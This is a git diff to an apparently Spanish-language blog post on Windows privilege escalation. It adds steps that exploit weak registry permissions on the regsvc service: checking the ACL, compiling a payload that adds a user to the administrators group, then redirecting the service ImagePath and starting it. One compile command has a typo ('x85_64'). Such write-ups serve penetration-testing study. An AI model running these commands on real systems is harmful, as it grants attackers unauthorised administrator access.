@@ -138,6 +138,14 @@ siendo **C:\Temp\setup.msi** la ruta especifica y de raiz del archivo que creamo
 
 abrir una **powershell** 
 
+en caso de que no se pueda, usar el siguiente comando:
+
+```Python
+%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe “Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl”
+```
+
+![](/TheusZero/images/post/WindowsPEA/registryDetection.png)
+
 #### Detection
 
 el comando :
@@ -147,9 +155,40 @@ Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\services\regsvc | fl
 ```
 nos mostrara que existe un servicio o registro como tal que tiene y ejecuta archivos de forma **NT AUTHORITY\INTERACTIVE** sobre la key del registro, por ende, si podemos configurarla a nuestro favor podremos obtener una shell de administrador
 
+![](/TheusZero/images/post/WindowsPEA/registryDetection2.png)
 
 #### Exploitation
 
-dentro de la maquina
+dentro de nuestra maquina crearemos un script que subiremos ya compilado a la maquina para que esta la ejecute como resgistro y nos de acceso a la maquina como tal.
 
 [reverse shell script .c for privesec](https://github.com/sagishahar/scripts.git)
+
+![](/TheusZero/images/post/WindowsPEA/registry.png)
+
+el comando que se le agrega es:
+
+```Python
+cmd.exe /k net localgroup administrators user /add
+```
+
+con este script listo lo compilaremos con:
+
+**Install gcc-mingw-w64 by sudo apt install gcc-mingw-w64 and compile c file using by x86_64-w64-mingw32-gcc windows_service.c -o x.exe**
+
+```Python
+x85_64-w64-mingw32-gcc NameArchive.c  -o x.exe
+```
+
+ahora queda pasarlo a la maquina y realizar el siguiente comando para agregarlo a los registros o servicios como tal:
+
+```Python
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
+
+sc start regsvc
+```
+
+recordar que x.exe corresponde al nombre del archivo
+
+## Executable Files
+
+
